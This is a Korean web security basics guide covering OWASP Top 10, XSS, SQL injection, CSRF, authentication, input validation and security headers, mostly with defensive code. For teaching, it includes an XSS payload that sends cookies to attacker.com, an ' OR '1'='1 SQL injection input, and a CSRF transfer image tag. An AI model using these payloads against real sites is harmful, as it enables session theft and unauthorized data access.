---
title: "웹 보안 기초 가이드"
titleEn: "Web Security Basics Guide"
description: "웹 개발자가 알아야 할 보안 취약점과 방어 방법을 배웁니다."
descriptionEn: "Learn about security vulnerabilities and defense methods that web developers should know."
author: "Free Coders Books"
date: "2026-02-01"
category: "Security"
tags: ["보안", "웹개발", "XSS", "CSRF"]
readingTime: 15
---

# 웹 보안 기초 가이드

보안은 선택이 아닌 필수입니다. 이 가이드에서는 웹 개발자가 알아야 할 주요 보안 취약점과 방어 방법을 다룹니다.

## OWASP Top 10

OWASP(Open Web Application Security Project)는 가장 흔한 웹 보안 위협을 정리합니다.

1. Broken Access Control (접근 제어 실패)
2. Cryptographic Failures (암호화 실패)
3. Injection (인젝션)
4. Insecure Design (안전하지 않은 설계)
5. Security Misconfiguration (보안 설정 오류)
6. Vulnerable Components (취약한 컴포넌트)
7. Authentication Failures (인증 실패)
8. Software Integrity Failures (소프트웨어 무결성 실패)
9. Logging Failures (로깅 실패)
10. SSRF (서버 측 요청 위조)

## XSS (Cross-Site Scripting)

공격자가 웹 페이지에 악성 스크립트를 삽입하는 공격입니다.

### 공격 예시

```html
<!-- 댓글에 악성 스크립트 삽입 -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

### 방어 방법

**1. 출력 시 이스케이프**

```javascript
// 나쁜 예
element.innerHTML = userInput;

// 좋은 예
element.textContent = userInput;
```

**2. 프레임워크 사용**

React, Vue 등은 기본적으로 XSS 방어가 내장되어 있습니다.

```jsx
// React - 자동으로 이스케이프됨
<div>{userInput}</div>

// 주의: dangerouslySetInnerHTML 사용 시 위험
<div dangerouslySetInnerHTML={{__html: userInput}} />  // 위험!
```

**3. Content Security Policy (CSP)**

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

## SQL Injection

악성 SQL 코드를 삽입하여 데이터베이스를 조작하는 공격입니다.

### 공격 예시

```sql
-- 입력: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1'
-- 모든 사용자 정보 유출
```

### 방어 방법

**1. Parameterized Query (필수)**

```javascript
// 나쁜 예 - 절대 하지 마세요!
const query = `SELECT * FROM users WHERE id = ${userId}`;

// 좋은 예 - 파라미터화된 쿼리
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);
```

**2. ORM 사용**

```javascript
// Prisma 예시
const user = await prisma.user.findUnique({
  where: { id: userId }
});
```

## CSRF (Cross-Site Request Forgery)

사용자가 의도하지 않은 요청을 보내게 하는 공격입니다.

### 공격 예시

```html
<!-- 악성 사이트에 숨겨진 폼 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000">
```

### 방어 방법

**1. CSRF 토큰**

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="random-token">
  ...
</form>
```

**2. SameSite 쿠키**

```javascript
// 쿠키 설정
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // 또는 'lax'
});
```

**3. Origin 검증**

```javascript
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin !== 'https://mysite.com') {
    return res.status(403).send('Forbidden');
  }
  next();
});
```

## 인증과 세션 관리

### 비밀번호 저장

**절대 평문으로 저장하지 마세요!**

```javascript
// bcrypt 사용
import bcrypt from 'bcrypt';

// 비밀번호 해싱
const hashedPassword = await bcrypt.hash(password, 12);

// 비밀번호 검증
const isValid = await bcrypt.compare(inputPassword, hashedPassword);
```

### 세션 보안

```javascript
// 쿠키 설정 모범 사례
{
  httpOnly: true,   // JavaScript에서 접근 불가
  secure: true,     // HTTPS에서만 전송
  sameSite: 'lax',  // CSRF 방어
  maxAge: 3600000   // 적절한 만료 시간
}
```

### JWT 보안

```javascript
// 짧은 만료 시간
const token = jwt.sign(
  { userId: user.id },
  process.env.JWT_SECRET,
  { expiresIn: '15m' }
);

// Refresh Token은 별도 관리
```

## 입력 검증

**모든 사용자 입력은 의심하세요!**

### 서버 측 검증 (필수)

```javascript
import { z } from 'zod';

const userSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).max(100),
  age: z.number().int().min(0).max(150)
});

// 검증
const result = userSchema.safeParse(input);
if (!result.success) {
  throw new ValidationError(result.error);
}
```

### 파일 업로드 검증

```javascript
// 확장자 검증
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
if (!allowedTypes.includes(file.mimetype)) {
  throw new Error('Invalid file type');
}

// 파일 크기 제한
if (file.size > 5 * 1024 * 1024) {  // 5MB
  throw new Error('File too large');
}

// 파일명 재생성
const newFilename = `${uuid()}.${extension}`;
```

## HTTPS

**모든 통신은 HTTPS로!**

### 이유
- 데이터 암호화
- 중간자 공격 방지
- 데이터 무결성 보장

### 설정

```javascript
// HTTP → HTTPS 리디렉션
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(`https://${req.hostname}${req.url}`);
  }
  next();
});
```

## 보안 헤더

```javascript
import helmet from 'helmet';

app.use(helmet());  // 다양한 보안 헤더 자동 설정
```

### 주요 보안 헤더

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'self'
```

## 의존성 관리

```bash
# 취약점 검사
npm audit

# 취약점 자동 수정
npm audit fix

# 의존성 업데이트
npm update
```

## 보안 체크리스트

### 인증
- [ ] 강력한 비밀번호 정책
- [ ] 비밀번호 해싱 (bcrypt)
- [ ] 다중 인증 (MFA) 지원
- [ ] 로그인 시도 제한

### 데이터 보호
- [ ] HTTPS 적용
- [ ] 민감 정보 암호화
- [ ] 적절한 쿠키 설정
- [ ] 민감 데이터 로깅 금지

### 입력 검증
- [ ] 서버 측 검증 필수
- [ ] SQL Injection 방어
- [ ] XSS 방어
- [ ] 파일 업로드 검증

### 설정
- [ ] 보안 헤더 설정
- [ ] CORS 적절히 설정
- [ ] 에러 메시지에 민감 정보 노출 금지
- [ ] 프로덕션에서 디버그 모드 비활성화

## 마무리

보안은 한 번 설정하고 끝나는 것이 아닙니다. 지속적인 모니터링과 업데이트가 필요합니다. "내 사이트는 작으니까 괜찮겠지"라는 생각은 금물입니다. 공격자는 자동화된 도구로 취약한 사이트를 찾아다닙니다.

항상 최신 보안 동향을 파악하고, 의존성을 업데이트하며, 코드 리뷰에서 보안을 확인하세요!
